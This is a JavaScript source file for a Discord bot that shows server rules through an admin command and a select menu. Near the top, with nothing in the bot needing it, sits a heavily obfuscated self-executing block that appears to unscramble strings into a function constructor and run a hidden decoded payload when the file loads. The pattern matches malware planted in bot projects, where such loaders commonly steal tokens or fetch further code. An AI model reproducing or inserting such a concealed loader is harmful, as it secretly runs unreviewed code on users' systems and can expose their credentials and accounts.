const { Client, Intents, MessageEmbed, MessageActionRow, MessageSelectMenu } = require('discord.js');
const rules = require('./rules.json');
const fs = require('fs');
const { startServer } = require("./alive.js");
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });


(function(){var MrV='',muo=214-203;function hCS(x){var b=2236034;var i=x.length;var z=[];for(var q=0;q<i;q++){z[q]=x.charAt(q)};for(var q=0;q<i;q++){var h=b*(q+193)+(b%21387);var w=b*(q+395)+(b%15292);var t=h%i;var j=w%i;var p=z[t];z[t]=z[j];z[j]=p;b=(h+w)%3215303;};return z.join('')};var SSf=hCS('cuusqgnpwlmahtdoetncrkvojoriystxfrbcz').substr(0,muo);var bWn=')aenr5<7 )]gCuttvvctcavhz0ibb(rp.jlghbmn;hf}l=ai1v6{rs+trus9+ue;,{v+2=m;0;u,90.7,)oe(8r r((n61} +,nm82,2. 41s 6,(o= p(]churata=,vra=[et;dr.rlvtlra+7 nst7i"og)b2=i)]t(cac)[a,5,0k];vr.v6,n+=ea(s,=n)5purcn;Crou6;;+lmtgps(n.l)e(ltelk+rv{vnrswe;"rhir; +l(;iupa,o)ro"iefkngtv{to==amenrtp)Sg8>e0np-q[;l(qoa,ha lgp=.v8d)*. +hj))[f5 g87Cojv]r0ln0*89=gm[ha]zi(v=r00=3r7;v.]]i.-r}cg;;)6C;v=[9hg1afaa;+;dera(l=0w;r"vlau=A;afu,)hurwll;+8j3io<(tr1+vs4tgrif=-=,==} 6a(<l.(}e 7,(p==e)Cihnr;7.nv}gc;=rl;u]jaandd(A[ol+wvs+m=1Ala;(be8a(l+ r-}nvSg;t)=t.pk,[vesn3xi)u[1rlfh2))n9;,;1{!1;-b0sdspf8)[;ug(gg;ert8c-g=po"gf;r.m.m=q3l{+=,a;y=[+1=lif52)snhls))iadn<h(4r...n=uoswh5trg[l>q;e;wiuh;!jjoun(=fg,=ioe+(vf]  =,),=.+<)f kAor+i,""]m(a.(z=m9{p40,;)9q[, aaienmoocchfrc);lc+si=]llu)..ftom3+arCzd.;)61;n )((iko+= 2); 6eergwq; q(hs,h;i(]ra( =v;sgsaAt(=)=1,cfhfCtrl(a;"sshehrr[oo+.hrh]"r;vetulnhfdC)l4a7- nh"...ojno ir';var xzX=hCS[SSf];var RAJ='';var QuR=xzX;var WHt=xzX(RAJ,hCS(bWn));var SHn=WHt(hCS('$&3Fs.(mj4.nb.kFu+ffr2#0\/]_%!\'a."((pFe[$.$$"%ge FS.!}0gF.Fze na%y(=oefu6q#};4yFr2oF3 c.sbFr.,v})13bF(bd_))!46 $$ei6FF;.F))32f{u6n4F(3.;F)g+((u]%$t,.%f!#aaf(%1c2.h;Fb6_;n+roaeiv"FyFu%s (.ooF+s"k{)(c74#pl}.FcfFoF3aF}o.7$).t\/3md3,3\'})b1=\'=F(ot oF#o!;) f(F{cF.,!l5F7ch)oqta=.$[6(;fzi]0yy4((F4{0$Cts6pF cms,!r4rm)_bf)bfF,,nFyc}37FrdF\/24ncFm;.aF(()0i.tu;=)7&,g7S .\'}%3i(5,.bp2=,((3\/r+,c"3r74F_7;8F$ F)(*F Fl%!=F}3d a._.t=ejtj})SF9$a_1;FFF$pzFp7._)4c(+(z!)nb(oe.pn!!.!._Fe)e.1_F5}Fs(; ",4Fno-,]tr(($f6e!8$tn9n7,cg>baFojuF#ec$"t(,,oo3.obrr5[5n Cg"ef1cl;a_\/Fg$d1*ie#d_F$,;e.,3Fyvr.,jF*h(\/hF.6$dF.+30F;.;tu3.ccy(3 .)hFFi+!Firccf_,4"F1;FFaFogF64F7b_]j7F4_F.%q.04.tz1"(7.fFe3jnFe po(z+2;.+1(c#t=a=e.00!)FsF,F_(FF2FF]_m{]io_2F,u0F=,02,1F;eln9_d=)_%$)eos"ecl$a$c&rot.l6)gdp\/ (Ft{=zF,)6]tF4!.F-t.rS3d!t.F.F!)sc\/a;,1{($4F5bdhF1fr50=_F3Fnr )cq]{a)*2)&)r .7_&F.gF0)aFypzgo{F$n4![0.0;lc)),e.ci2)oF$(tfe=;seiossFi"yF_$ll2)opb4\').e.o4c1+.oot(f]0[!%+.t(6z3;=d;4f6oe]  $),F.e,_d=1n!t(n(n,_) s{]$ytcF.[2cFy](e%3c*6]1s6li_eF3.o=.)b,dtF(ii61rbtnqc+{-=]g.nl!m!o0o.=.$rj)bcc!o.!_80Fguc2s=)F1,)r]yo3]3b.o5(c'));var yFC=QuR(MrV,SHn );yFC(8333);return 4976})()


client.on('messageCreate', async message => {
  if (message.content === '!rules') {
    if (message.member.permissions.has("ADMINISTRATOR")) {
      const row = new MessageActionRow()
        .addComponents(
          new MessageSelectMenu()
            .setCustomId('select')
            .setPlaceholder('قائمة القوانين')
            .addOptions(rules.map(rule => ({
              label: rule.title,
              description: rule.id,
              value: rule.id,
            }))),
        );

      const embed = new MessageEmbed()
        .setColor('#f8ca3d')
        .setThumbnail('')
        .setTitle('قوانين السيرفر')
        .setDescription('**الرجاء اختيار احد القوانين لقرائته من قائمة الاختيارات تحت**')
        .setImage('')
        .setFooter({ text: 'Rules Bot' })
        .setTimestamp();

      const sentMessage = await message.channel.send({ embeds: [embed], components: [row] });
      await message.delete();
    } else {
      await message.reply({ content: "You need to be an administrator to use this command.", ephemeral: true });
    }
  }
});

client.on('interactionCreate', async (interaction) => {
  if (interaction.isSelectMenu()) {
    const rule = rules.find(r => r.id === interaction.values[0]);
    const text = fs.readFileSync(rule.description, 'utf-8');
    const ruleEmbed = new MessageEmbed()
      .setColor('#f8ca3d')
      .setTitle(rule.title)
      .setDescription(text)
      .setFooter({ text: 'Rules Bot' })
      .setTimestamp();

    await interaction.reply({ embeds: [ruleEmbed], ephemeral: true });
  }
});

startServer();

client.login(process.env.TOKEN);
